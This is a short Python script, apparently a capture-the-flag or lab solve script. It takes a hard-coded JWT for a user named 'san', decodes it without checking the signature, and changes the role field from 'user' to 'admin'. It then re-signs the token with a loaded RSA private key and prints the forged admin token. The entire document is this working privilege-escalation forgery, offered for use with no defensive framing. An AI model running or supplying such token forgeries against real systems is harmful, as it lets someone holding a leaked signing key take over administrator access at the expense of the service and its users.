import jwt

# Load your private key
with open('private.pem', 'rb') as f:
    PRIVATE_KEY = f.read()

# Original token (replace with your actual token)
original_token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoic2FuIiwidHlwZSI6InVzZXIiLCJpYXQiOjE3MjMwODk1ODMsImV4cCI6MTcyMzA5MzE4Mywibm9uY2UiOiI1ZDQxNDAyYWJjNGIyYTc2Yjk3MTlkOTExMDE3YzU5MiJ9.ni3YJh3dXk6j1Qc6Cg1JIKn0I-IYq3NxHe8bTM9AlmPjhPEJnMgZqDeDt_XDTjmyDkq4_1RyHG0y2ymEgKUNYTqsQjtFPCFIzRUFPyqSr8CViJttIe0aXTjioAiZYYEBgyrCHJu2czdMJpVK5FzjRW34Dz5fCOy5JCtbyFt4x4xjlQbsOT_g1aQnPjea3gBK1I_9kSiM8FumH8obUIzX3F4Gg9-XblogzraXDxmbGpRDZWP-v72-rdnXCyJznNbWwf39lMZlzImIR-KoPVYb9wfIu8Dnb-Qrd8muGAPzA7vzPOyVQMiHj_dwRYDMOg52VnHafut96arvCBSqi5LnTw"

# Decode the token without verifying the signature to access the payload
decoded_payload = jwt.decode(original_token, options={"verify_signature": False})

# Modify the payload
decoded_payload['type'] = 'admin'

# Re-sign the token using the private key
new_token = jwt.encode(decoded_payload, PRIVATE_KEY, algorithm="RS256")

print(f"New JWT Token: {new_token}")
